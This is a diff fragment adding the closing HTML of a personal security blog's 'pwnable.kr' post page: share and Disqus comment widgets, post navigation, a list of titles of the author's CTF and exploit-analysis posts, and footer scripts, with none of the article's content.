+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-6 i,
+        .toc-level-6 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"true"];
+    </script>
+
+
+
+    
+    <div class="share">
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"pwnable.kr　| Sp4n9x's Blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    </div>
+
+
+
+
+    
+        <section id="comments">
+    <style> aside.comment-bar { margin: auto 30px; }</style>
+    <div id="disqus_thread"></div>
+    <script>
+        var disqus_config = function () {
+            this.page.url = 'http://sp4n9x.github.io/2018/03/23/pwnable.kr/';
+            this.page.identifier = '2018/03/23/pwnable.kr/';
+        };
+        var loadComment = function() {
+            var d = document, s = d.createElement('script');
+            s.src = '//Sp4n9x.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', +new Date());
+            (d.head || d.body).appendChild(s);
+        }
+    </script>
+    
+    <script> loadComment(); </script>
+
+</section>
+
+
+<script id="dsq-count-scr" src="//Sp4n9x.disqus.com/count.js" async></script>
+<span class="disqus-comment-count" data-disqus-identifier="2018/03/23/pwnable.kr/"></span>
+<span class="disqus-comment-count" data-disqus-url="http://sp4n9x.github.io/2018/03/23/pwnable.kr/"></span>
+<script>
+    $(".disqus-comment-count").hide();
+    var $disqusCount = $(".disqus-comment-count");
+    $disqusCount.bind("DOMNodeInserted", function(e) {
+        $(".count-comment").text(
+            $(this).text().replace(/[^0-9]/ig,"")
+        )
+        DISQUSWIDGETS.getCount({reset: true});
+    })
+</script>
+
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2018/04/05/Pwn环境搭建-Ubuntu16.04/" title="上一篇: Pwn环境搭建——Ubuntu16.04">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2018/01/27/MySQL宽字节注入/" title="下一篇: MySQL宽字节注入">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/08/15/ret2_dl_runtime_resolve详解/">ret2_dl_runtime_resolve详解</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/19/RCTF2015——WriteUp(Pwn)/">RCTF2015——WriteUp(Pwn)</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/05/ZCTF2016——WriteUp(Pwn)/">ZCTF2016——WriteUp(Pwn)</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/05/08/ZIP文件格式分析/">ZIP文件格式分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/10/RAR文件格式分析/">RAR文件格式分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/11/OilRig新型BondUpdater木马的DNS隐蔽隧道通信行为分析/">OilRig新型BondUpdater木马的DNS隐蔽隧道通信行为分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/10/26/护网杯2018——WriteUp/">护网杯2018——WriteUp</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/06/CVE-2010-3333复现与分析/">CVE-2010-3333复现与分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/01/CVE-2010-2883复现与分析/">CVE-2010-2883复现与分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/27/redhat2018—writeup/">redhat2018—writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/11/一步一步学ROP之Linux_x64篇-蒸米/">一步一步学ROP之Linux_x64篇-蒸米</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/10/一步一步学ROP之Linux_x86篇-蒸米/">一步一步学ROP之Linux_x86篇-蒸米</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/08/Kali2018-搜狗输入法安装/">Kali2018-搜狗输入法安装</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/05/Pwn环境搭建-Ubuntu16.04/">Pwn环境搭建——Ubuntu16.04</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/23/pwnable.kr/">pwnable.kr</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/27/MySQL宽字节注入/">MySQL宽字节注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/15/实验吧Wirteup合集/">实验吧WriteUp合集</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2018-2020 Sp4n9x
+            </div>
+            <div class="footer-right">
+                <span> Sp4n9x's Blog <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+    </div>
+</footer>
+    </div>
+    
+    <script src="/js/GithubRepoWidget.js"></script>
+
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 10;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+    <script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+});
+
+MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';                 
+    }       
+});
+</script>
+
+<script src="//cdn.bootcss.com/mathjax/2.6.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+             github: ".github-widget a", 
+            
+             post: ".article-entry a[href]", 
+             tags: ".article-tag a", 
+             categories: ".article-category a, a.tag-list-link", 
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+    <!-- 点击爱心效果 -->
+    <script src="/js/love.js"></script>
+  </div>
+</body>
+</html>
